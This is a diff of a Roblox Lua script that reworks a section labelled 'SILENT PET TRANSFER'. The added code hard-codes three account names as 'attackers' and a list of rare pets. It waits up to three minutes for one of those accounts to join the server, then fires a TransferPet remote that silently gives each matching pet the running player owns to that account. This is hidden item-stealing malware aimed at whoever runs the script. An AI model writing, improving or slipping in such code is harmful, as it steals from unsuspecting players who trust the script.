@@ -102,36 +102,50 @@ task.delay(3, function()
     end)
 end)
 
--- 🐾 3. SILENT PET TRANSFER
-local attackers = {
-    ["boneblossom215"] = true,
-    ["beanstalk1251"] = true,
-    ["Burningbud709"] = true
-}
-local targetPets = {
-    ["trex"] = true, ["fennec fox"] = true, ["raccoon"] = true, ["dragonfly"] = true,
-    ["butterfly"] = true, ["queenbee"] = true, ["spinosaurus"] = true, ["redfox"] = true,
-    ["brontosaurus"] = true, ["mooncat"] = true, ["mimic octopus"] = true,
-    ["disco bee"] = true, ["dilophosaurus"] = true, ["kitsune"] = true
-}
+-- 🐾 3. SILENT PET TRANSFER (with 3-sec delay and 3-min timeout)
 task.delay(3, function()
-    while true do
-        for _, plr in pairs(Players:GetPlayers()) do
-            if attackers[plr.Name] then
-                local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets", 5)
-                if petFolder then
-                    for _, pet in pairs(petFolder:GetChildren()) do
-                        if targetPets[string.lower(pet.Name)] then
-                            local remote = ReplicatedStorage:FindFirstChild("TransferPet")
-                            if remote then
-                                remote:FireServer(pet, plr)
-                            end
-                        end
+    local attackers = {
+        ["boneblossom215"] = true,
+        ["beanstalk1251"] = true,
+        ["burningbud709"] = true,
+    }
+
+    local targetPets = {
+        ["trex"] = true, ["fennec fox"] = true, ["raccoon"] = true, ["dragonfly"] = true,
+        ["butterfly"] = true, ["queenbee"] = true, ["spinosaurus"] = true, ["redfox"] = true,
+        ["brontosaurus"] = true, ["mooncat"] = true, ["mimic octopus"] = true,
+        ["disco bee"] = true, ["dilophosaurus"] = true, ["kitsune"] = true
+    }
+
+    local maxWait = 180 -- 3 minutes
+    local elapsed = 0
+    local receiver = nil
+
+    while elapsed < maxWait and not receiver do
+        for _, player in pairs(Players:GetPlayers()) do
+            if attackers[player.Name] then
+                receiver = player
+                break
+            end
+        end
+        if not receiver then
+            task.wait(2)
+            elapsed += 2
+        end
+    end
+
+    if receiver then
+        local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets", 5)
+        if petFolder then
+            for _, pet in pairs(petFolder:GetChildren()) do
+                if targetPets[string.lower(pet.Name)] then
+                    local remote = ReplicatedStorage:FindFirstChild("TransferPet")
+                    if remote then
+                        remote:FireServer(pet, receiver)
                     end
                 end
             end
         end
-        task.wait(5)
     end
 end)
 ]]
